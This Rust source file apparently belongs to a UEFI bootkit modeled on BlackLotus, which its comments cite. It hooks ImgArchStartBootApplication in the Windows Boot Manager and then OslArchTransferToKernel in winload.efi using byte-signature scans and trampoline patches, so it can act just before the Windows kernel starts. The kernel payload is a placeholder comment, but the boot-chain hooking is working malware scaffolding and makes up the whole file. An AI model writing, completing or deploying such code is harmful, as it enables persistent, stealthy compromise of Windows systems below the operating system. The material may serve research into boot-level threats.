use core::{slice::from_raw_parts};
use uefi::prelude::BootServices;
use uefi::proto::loaded_image::LoadedImage;
use uefi::Handle;

use crate::boot::utils::{pattern_scan, trampoline_hook64, trampoline_unhook};

extern crate alloc;

#[allow(non_camel_case_types)]
type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u8, image_size: u32, boot_option: u8, return_arguments: *mut u8);

#[allow(non_upper_case_globals)]
static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;

#[allow(non_camel_case_types)]
type OslArchTransferToKernelType = fn(loader_block: *mut u8, entry: *mut u8);

#[allow(non_upper_case_globals)]
static mut OslArchTransferToKernel: Option<OslArchTransferToKernelType> = None;

const JMP_SIZE: usize = 14;
static mut ORIGINAL_BYTES: [u8; JMP_SIZE] = [0; JMP_SIZE];

pub fn setup_hooks(bootmgfw_handle: &Handle, boot_services: &BootServices) -> uefi::Result<> {
    // Open a handle to the loaded image bootmgfw.efi
    let bootmgr = boot_services.open_protocol_exclusive::<LoadedImage>(*bootmgfw_handle)?;

    // Returns the base address and the size in bytes of the loaded image.
    let (image_base, image_size) = bootmgr.info();

    // Read Windows Boot Manager (bootmgfw.efi) from memory and store in a slice
    let bootmgfw_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the ImgArchStartBootApplication signature in Windows EFI Boot Manager (bootmgfw.efi) and return an offset
    let offset = pattern_scan(
        bootmgfw_data, 
        "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9")
        .expect("Failed to pattern scan for ImgArchStartBootApplication")
        .expect("Failed to find ImgArchStartBootApplication pattern"
    );

    // Print the bootmgfw.efi image base and of ImgArchStartBootApplication offset and image base
    log::info!("bootmgfw.efi: {:#x}", image_base as usize);
    log::info!("ImgArchStartBootApplication offset: {:#x}", offset);
    log::info!("bootmgfw.efi + ImgArchStartBootApplication offset = {:#x}", (image_base as usize + offset));

    // Save the address of ImgArchStartBootApplication
    unsafe { ImgArchStartBootApplication = Some(core::mem::transmute::<_, ImgArchStartBootApplicationType>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook ImgArchStartBootApplication and save stolen bytes
    unsafe {
        ORIGINAL_BYTES = trampoline_hook64( 
            ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,
            img_arch_start_boot_application_hook as *mut () as *mut u8,
            JMP_SIZE
        ).expect("Failed to hook on ImgArchStartBootApplication");
    }

    Ok(())
}

/// ImgArchStartBootApplication in bootmgfw.efi: hooked to catch the moment when the Windows OS loader (winload.efi) 
/// is loaded in the memory but still hasn't been executed to perform more in-memory patching.
/// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mut u8, image_size: u32, _boot_option: u8, _return_arguments: *mut u8) {
    
    // Unhook ImgArchStartBootApplication and restore stolen bytes before we do anything else
    unsafe { 
        trampoline_unhook(
        ImgArchStartBootApplication.unwrap() as *mut () as *mut u8,
        ORIGINAL_BYTES.as_mut_ptr(), JMP_SIZE
        ) 
    };

    // Read the data Windows OS Loader (winload.efi) from memory and store in a slice
    let winload_data = unsafe { from_raw_parts(image_base as *mut u8, image_size as usize) };

    // Look for the OslArchTransferToKernel signature in Windows OS Loader (winload.efi) and return an offset
    let offset = pattern_scan(
        winload_data,
        "33 F6 4C 8B E1 4C 8B")
        .expect("Failed to pattern scan for OslArchTransferToKernel")
        .expect("Failed to find OslArchTransferToKernel pattern"
    );

    // Print the winload.efi image base and OslArchTransferToKernel offset and image base
    log::info!("winload.efi: {:#x}", image_base as usize);
    log::info!("OslArchTransferToKernel offset: {}", offset);
    log::info!("winload.efi + OslArchTransferToKernel offset = {:#x}", (image_base as usize + offset));

    // Save the address of OslArchTransferToKernel
    unsafe { OslArchTransferToKernel = Some(core::mem::transmute::<_, OslArchTransferToKernelType>((image_base as usize + offset) as *mut u8)) }

    // Trampoline hook OslArchTransferToKernel and save stolen bytes
    unsafe {
        ORIGINAL_BYTES = trampoline_hook64( 
            OslArchTransferToKernel.unwrap() as *mut () as *mut u8,
            osl_arch_transfer_to_kernel_hook as *mut () as *mut u8,
            14
        ).expect("Failed to perform trampoline hook on OslArchTransferToKernel");
    }

    // Call the original unhooked ImgArchStartBootApplication function
    unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
}

/// OslArchTransferToKernel in winload.efi: Hooked to catch the moment when the OS kernel and some of the system drivers are 
/// already loaded in the memory, but still haven’t been executed to perform more in-memory patching
/// https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
fn osl_arch_transfer_to_kernel_hook(loader_block: *mut u8, entry: *mut u8) {
    
    // Unhook OslArchTransferToKernel and restore stolen bytes before we do anything else
    unsafe { trampoline_unhook(
        OslArchTransferToKernel.unwrap() as *mut () as *mut u8,
        ORIGINAL_BYTES.as_mut_ptr(),
        JMP_SIZE
        )
    };

    // Do kernel ninja shit here:

    // Call the original unhooked OslArchTransferToKernel function
    unsafe { OslArchTransferToKernel.unwrap()(loader_block, entry) };
}